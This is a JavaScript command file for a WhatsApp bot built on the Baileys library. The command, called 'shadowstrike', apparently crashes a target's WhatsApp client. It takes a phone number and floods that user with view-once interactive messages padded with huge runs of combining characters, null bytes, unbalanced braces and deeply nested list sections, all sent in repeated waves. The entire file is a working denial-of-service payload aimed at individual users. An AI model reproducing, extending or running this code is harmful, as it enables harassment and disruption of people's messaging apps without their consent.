const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

const randomDelay = (min, max) => new Promise(r => setTimeout(r, Math.floor(Math.random() * (max - min + 1)) + min));

module.exports = {
  name: 'shadowstrike',
  aliases: ['ss', 'shadow'],
  description: '👿Shadow are invisible',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    const target = args[0];
    const ownerNumbers = helpers.getOwnerNumbers();
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : sender;
    
    if (!target) {
      return await sock.sendMessage(chatId, { 
        text: `You be fool? 🤦 where the number?

📱 ᴜsᴀɢᴇ: .sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ 234✘✘✘
🛑 sᴛᴏᴘ: .sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ sᴛᴏᴘ` 
      });
    }

    if (target.toLowerCase() === 'stop') {
      const stopped = attackManager.stopAllAttacksForSender(sender);
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🛑 ᴀᴛᴛᴀᴄᴋ ʜᴀʟᴛᴇᴅ 🛑
╚═══════════════════════════════════════════╝

${stopped > 0 ? `✅ sᴛᴏᴘᴘᴇᴅ ${stopped} ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ(s)` : '⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ғᴏᴜɴᴅ'}

👿 "ᴛʜᴇ sʜᴀᴅᴏᴡs ғᴀᴅᴇ" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const attackId = attackManager.generateAttackId(sender, targetJid, 'shadowstrike');

    if (attackManager.isAttackActive(attackId)) {
      return await sock.sendMessage(chatId, { 
        text: `⚠️ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!\n\n🛑 ᴜsᴇ .sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ sᴛᴏᴘ ᴛᴏ ʜᴀʟᴛ` 
      });
    }

    attackManager.startAttack(attackId, {
      sender,
      target: targetJid,
      commandName: 'shadowstrike',
      chatId
    });

    await sock.sendMessage(chatId, { 
      text: `╔═══════════════════════════════════════════╗
║ 🌑 sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ 🌑
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ᴄᴏɴᴊᴜʀɪɴɢ ᴅᴀʀᴋɴᴇss...
🔄 ᴄʏᴄʟᴇs: 0/100

👿 "sᴛʀɪᴋᴇ sᴡɪғᴛ, sᴛʀɪᴋᴇ ʜᴀʀᴅ" ☠️
╰────────────────────────────────────────╯` 
    });

    const texts = [
      "ᬼ".repeat(60000),
      "ោ៝".repeat(60000), 
      ".ؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕ".repeat(20000),
      "𑜦𑜠".repeat(60000), 
      "ًٌٍٍَُِِّّّْ".repeat(20000), 
      "ꦾ".repeat(60000), 
      "ۢ۬ۤۢ".repeat(20000),
      "᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳".repeat(20000),
    ];

    const InvisiPayload = async () => {
      try {
        await randomDelay(200, 400);
        let sections = [];

        for (let i = 0; i < 1000; i++) {
          let largeText = "ꦾ".repeat(45000);

          let deepNested = {
            title: `Super Deep Nested Section ${i}`,
            highlight_label: `Extreme Highlight ${i}`,
            rows: [
              {
                title: largeText,
                id: `id${i}`,
                subrows: [
                  {
                    title: "Nested row 1",
                    id: `nested_id1_${i}`,
                    subsubrows: [
                      { title: "Deep Nested row 1", id: `deep_nested_id1_${i}` },
                      { title: "Deep Nested row 2", id: `deep_nested_id2_${i}` },
                    ],
                  },
                  { title: "Nested row 2", id: `nested_id2_${i}` },
                ],
              },
            ],
          };
          sections.push(deepNested);
        }

        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [targetJid],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: targetJid,
                  },
                },
                body: {
                  text: "LORD DEVINE SHADOWSTRIKE",
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: JSON.stringify({ sections: sections.slice(0, 100) }) },
                    { name: "call_permission_request", buttonParamsJson: "" },
                    { name: "mpm", buttonParamsJson: "" },
                    { name: "mpm", buttonParamsJson: "" },
                    { name: "mpm", buttonParamsJson: "" },
                    { name: "mpm", buttonParamsJson: "" },
                  ],
                },
              },
            },
          },
        };

        await sock.relayMessage(targetJid, message, { participant: { jid: targetJid } });
      } catch (err) {
        console.error('InvisiPayload error:', err.message);
      }
    };

    const crashui = async () => {
      try {
        await randomDelay(200, 400);
        await sock.relayMessage(targetJid, {
          viewOnceMessage: {
            message: {
              buttonsMessage: {
                text: "🩸⃟⃨〫⃰‣ ⁖ Lord Devine‣—",
                contentText: "🩸⃟⃨〫⃰‣ ⁖ Lord Devine‣—" + "\u0000".repeat(70000),
                contextInfo: {
                  forwardingScore: 6,
                  isForwarded: true
                },
                headerType: 1,
                buttons: [
                  {
                    body: {
                      text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી ) 𐎟"
                    }
                  }
                ],
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: "" },
                    { name: "call_permission_request", buttonParamsJson: "" },
                    { name: "mpm", buttonParamsJson: "" }
                  ]
                }
              }
            }
          }
        }, {});
      } catch (err) {
        console.error('crashui error:', err.message);
      }
    };

    const shadowBlast = async () => {
      for (const text of texts) {
        if (!attackManager.isAttackActive(attackId)) break;
        try {
          await randomDelay(200, 400);
          const msg = await generateWAMessageFromContent(
            targetJid,
            {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: {
                      title: " ~ 🦠𞋯𝑱ᮖ࿚ᮘ𝐥࿆𝜣ᮏ  ᮓ𝜩꣡𝑹𝑨𝑳𝑫𝒁🍷𞋯 ~",
                      hasMediaAttachment: false,
                    },
                    body: {
                      text: "\n" + text,
                    },
                    nativeFlowMessage: {
                      messageParamsJson: "{".repeat(10000),
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({ status: true })
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: JSON.stringify({ status: true })
                        },
                      ],
                    },
                    contextInfo: {
                      isForwarded: true,
                      forwardingScore: 999,
                      businessMessageForwardInfo: {
                        businessOwnerJid: "0@s.whatsapp.net" 
                      },
                      disappearingMode: {
                        initiator: "INITIATED_BY_OTHER",
                        trigger: "ACCOUNT_SETTING"
                      },
                      externalAdReply: {
                        title: "🕷️ ~ raldzz`executive ~ 🕷️",
                        body: "ោ៝".repeat(10000),
                        mediaType: 1,
                        thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                        mediaUrl: "about:blank",
                        sourceUrl: "about:blank",
                      }
                    }
                  }
                }
              }
            },
            {}
          );
          await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        } catch (err) {
          console.error('shadowBlast error:', err.message);
        }
      }
    };

    const darkVoid = async () => {
      for (let wave = 0; wave < 10; wave++) {
        if (!attackManager.isAttackActive(attackId)) break;
        try {
          await randomDelay(200, 400);
          const payload = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: { title: "SHADOW VOID", hasMediaAttachment: true },
                  body: { text: texts[Math.floor(Math.random() * texts.length)] },
                  nativeFlowMessage: {
                    messageParamsJson: "{".repeat(50000),
                    buttons: Array(10).fill().map(() => ({
                      name: "mpm",
                      buttonParamsJson: JSON.stringify({ void: "shadow".repeat(10000) })
                    }))
                  },
                  contextInfo: {
                    forwardingScore: 999999,
                    isForwarded: true,
                    externalAdReply: {
                      title: "DARK VOID",
                      body: texts[0].substring(0, 30000),
                      mediaType: 2,
                      thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg"
                    }
                  }
                }
              }
            }
          }, {});

          for (let i = 0; i < 5; i++) {
            try {
              await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id + i });
              await randomDelay(30, 80);
            } catch (_) {}
          }
        } catch (err) {
          console.error('darkVoid error:', err.message);
        }
      }
    };

    try {
      await InvisiPayload();
      await crashui();
      await shadowBlast();
      await darkVoid();

      attackManager.stopAttack(attackId);

      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ ✅ sʜᴀᴅᴏᴡsᴛʀɪᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ ✅
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: sʜᴀᴅᴏᴡs ᴜɴʟᴇᴀsʜᴇᴅ

👿 "ᴛʜᴇ ᴅᴀʀᴋɴᴇss ʜᴀs sᴛʀᴜᴄᴋ" ☠️
╰────────────────────────────────────────╯` 
      });
    } catch (err) {
      console.error('Shadowstrike execution error:', err);
      attackManager.stopAttack(attackId);
      await sock.sendMessage(chatId, { 
        text: `⛔ ᴇʀʀᴏʀ: ${err.message}` 
      });
    }
  }
};
  
